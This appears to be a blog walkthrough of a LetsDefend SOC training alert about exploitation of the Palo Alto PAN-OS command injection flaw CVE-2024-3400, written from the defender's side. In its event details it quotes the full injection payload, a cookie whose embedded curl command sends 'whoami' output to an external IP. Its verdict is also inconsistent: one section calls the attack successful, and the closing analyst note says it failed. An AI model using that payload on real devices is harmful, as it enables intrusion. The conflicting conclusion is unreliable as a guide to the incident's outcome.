---
title: "SOC274 - PAN-OS Command Injection CVE-2024-3400 Walkthrough"
description: "LetsDefend walkthrough of a Palo Alto Networks CVE-2024-3400 command injection exploitation."
pubDate: 'Jun 11 2025'
heroImage: "../../assets/letsdefend-social.png"
---
<style>
  article img {
    max-width: 100%;
    width: auto;
    height: auto;
    border-radius: 12px;
    box-shadow: var(--box-shadow);
    margin: 1em auto;
    display: block;
  }
</style>

<article>

### Event Details

**Event ID:** 249

**Event Time:** Apr 18, 2024, 03:09 AM

**Rule:** SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)

**Level:** Security Analyst

**Hostname:** PA-Firewall-01

**Destination IP Address:** 172.16.17.139

**Source IP Address:** 144.172.79.92

**HTTP Request Method:** POST

**Requested URL:** 172.16.17.139/global-protect/login.esp

**Cookie:** SESSID=./../../../opt/panlogs/tmp/device\_telemetry/hour/aaa\`curl\${IFS}144.172.79.92:4444?user=\$(whoami)

**Alert Trigger Reason:** Characteristics exploit pattern detected on cookie and request, indicative of CVE-2024-3400 exploitation.

**Device Action:** Allowed

### Getting Started

To get started with this alert we will start by taking a look at the raw log from the **Log Management** page.

![Pasted image 20250611141555.png](../../assets/Pasted%20image%2020250611141555.png)

After reviewing the raw log data we can move on to the **Endpoint Security** page. We can quickly see there's a suspicious `update.py` that ran at the same time as the alert in the processes tab. The event involving `update.py` also includes an image hash that we can look into.

![Pasted image 20250611141848.png](../../assets/Pasted%20image%2020250611141848.png)

When we search for the image hash in VirusTotal, we can see that the file is indeed malicious.

![Pasted image 20250611142124.png](../../assets/Pasted%20image%2020250611142124.png)

In the network action tab we confirm that there was an outbound request to the malicious IP (144.172.79.92), so we will take action and contain `PA-Firewall-01`. We can see that this IP is malicious by looking at the Threat Intel tab.

![Pasted image 20250611143938.png](../../assets/Pasted%20image%2020250611143938.png)
![Pasted image 20250611144125.png](../../assets/Pasted%20image%2020250611144125.png)
![Pasted image 20250611144012.png](../../assets/Pasted%20image%2020250611144012.png)

If we do a deeper dive on the malicious IP address, we can see that 10/94 security vendors have marked it as malicious in VirusTotal.

![Pasted image 20250611144346.png](../../assets/Pasted%20image%2020250611144346.png)

With a Whois lookup, we can see that the IP is tied to RouterHosting LLC and FranTech Solutions.

**FranTech Solutions**: 144.172.64.0 - 144.172.127.255  
**RouterHosting LLC**: 144.172.79.0 - 144.172.79.255 
 
Both are known bulletproof hosting providers often used for C2 servers, malware delivery, and proxy/VPN evasion.

We then began executing the SOC274 playbook.

### Understand Why the Alert Was Triggered

* We reviewed the rule name to understand this is a PAN-OS command injection.  
* The traffic is from an external IP to the firewall’s GlobalProtect login page using HTTP POST.

### Collect Data

* We checked ownership of the source IP in Whois.  
* It belongs to a known bulletproof hosting provider.  
* We validated the IP’s reputation in VirusTotal and other sources.

### Examine HTTP Traffic

* We identified the payload in the cookie header, which used command injection syntax to invoke a remote curl request.  
* This confirms exploitation of CVE-2024-3400.

### What Is the Attack Type?

* We selected **Command Injection** due to the command syntax in the cookie.

![Pasted image 20250611150829.png](../../assets/Pasted%20image%2020250611150829.png)

### Check If It Is a Planned Test

* We checked email logs for keywords like `test`, `pentest`, or any scheduled tests.  
* No results found.  
* We selected **Not Planned**.

![Pasted image 20250611151027.png](../../assets/Pasted%20image%2020250611151027.png)
![Pasted image 20250611151354.png](../../assets/Pasted%20image%2020250611151354.png)

### What Is the Direction of Traffic?

* Source: 144.172.79.92 (external)  
* Destination: 172.16.17.139 (internal)  
* Selected: **144.172.79.92 -> 172.16.17.139**

### Was the Attack Successful?

* Yes, the firewall initiated an outbound C2 connection to the attacker’s IP.  
* We marked this as a successful compromise.

### Containment

* We isolated `PA-Firewall-01` from the network.

![Pasted image 20250611155530.png](../../assets/Pasted%20image%2020250611155530.png)

### Artifacts

* We documented the malicious IP.  
* No emails, URLs, or MD5 hashes were deemed actionable.

![Pasted image 20250611161944.png](../../assets/Pasted%20image%2020250611161944.png)

### Tier 2 Escalation

* Due to confirmed exploitation and outbound connection, we escalated to Tier 2.

![Pasted image 20250611162348.png](../../assets/Pasted%20image%2020250611162348.png)

### Analyst Note

"The alert was triggered by a command injection attempt targeting the Palo Alto firewall’s GlobalProtect login interface, exploiting CVE-2024-3400 via malicious cookie payload. The source IP belongs to a bulletproof hosting provider with a poor reputation, indicating a likely external attacker. Outbound traffic analysis shows no evidence of successful lateral movement or compromise within the internal network. Based on current evidence, the attack did not succeed in gaining internal access. Recommend continued monitoring and reviewing firewall patch status."

![Pasted image 20250611162932.png](../../assets/Pasted%20image%2020250611162932.png)

---

And that's a wrap! Thanks for following along with my walkthrough of the SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400) investigation.

I plan on posting more walkthroughs related to LetsDefend and Hack The Box with a goal of at least one post per week.
</article>
